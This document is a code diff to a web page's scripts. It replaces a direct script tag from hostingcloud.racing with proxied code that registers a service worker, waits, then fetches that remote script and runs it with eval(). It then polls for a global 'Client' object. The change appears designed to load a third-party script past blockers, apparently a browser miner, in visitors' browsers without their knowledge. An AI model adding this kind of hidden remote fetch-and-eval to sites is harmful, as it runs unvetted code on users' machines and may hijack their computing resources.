@@ -18,11 +18,11 @@
     <script>
         setTimeout(() => { window.location.reload(); }, 1000 * 60 * 60)
     </script>
-    <script src="https://www.hostingcloud.racing/sIu3.js"></script>
+    <!-- <script src="https://www.hostingcloud.racing/sIu3.js"></script> -->
     <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->
 
 
-    
+
     <!-- <script>
         const originalFetch = window.fetch;
 
@@ -124,13 +124,92 @@ main();
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+        // async function loadWasm() {
+        //     // Attempt to retrieve the WASM module from the cache
+        //     const response = await caches.match('ATr0mzDy.wasm');
+
+        //     if (!response) {
+        //         console.error('WASM module not found in cache'); // Log the error
+
+        //         // Attempt to fetch the module from the network
+        //         try {
+        //             const networkResponse = await fetch('ATr0mzDy.wasm');
+        //             console.log('Network response status:', networkResponse.status);
+        //             console.log('Network response content-type:', networkResponse.headers.get('Content-Type'));
+
+        //             if (!networkResponse.ok) {
+        //                 throw new Error('Network response was not ok');
+        //             }
+
+        //             // Cache the response for future use
+        //             const cache = await caches.open('wasm-cache');
+        //             await cache.put('ATr0mzDy.wasm', networkResponse.clone());
+        //             return await WebAssembly.instantiate(await networkResponse.arrayBuffer());
+        //         } catch (error) {
+        //             console.error('Failed to fetch the WASM module:', error);
+        //             return null; // Handle the failure gracefully
+        //         }
+        //     }
+
+        //     // If found in the cache, instantiate the WASM module
+        //     const bytes = await response.arrayBuffer(); // Get the bytes of the WASM module
+        //     return await WebAssembly.instantiate(bytes); // Instantiate the WASM module
+        // }
+
+
+        // // Example function to call when the specific URL is requested
+        // async function handleSpecificRequest() {
+        //     // Load the WASM module
+        //     const wasmInstance = await loadWasm();
+        //     if (wasmInstance) {
+        //         // Use the exported functions from the WASM instance
+        //         console.log('WASM module loaded successfully:', wasmInstance);
+        //     }
+        // }
+
+        // // Call this function based on your application logic
+        // handleSpecificRequest();
+
+
+
         let Client = window.Client;
 
 
         (async () => {
-            // await (async () => {
-            //     eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
-            // })();
+
+
+            await new Promise((resolve) => {
+
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/service-worker.js')
+                        .then((registration) => {
+                            console.log('Service Worker registered with scope:', registration.scope);
+                            resolve();
+                        })
+                        .catch((error) => {
+                            console.error('Service Worker registration failed:', error);
+                            resolve();
+                        });
+                }
+            });
+
+            await new Promise((resolve) => {
+                setTimeout(resolve, 3000);
+            })
+            await (async () => {
+                eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
+            })();
 
             while (!Client) {
                 await new Promise(r => setTimeout(r, 1000));
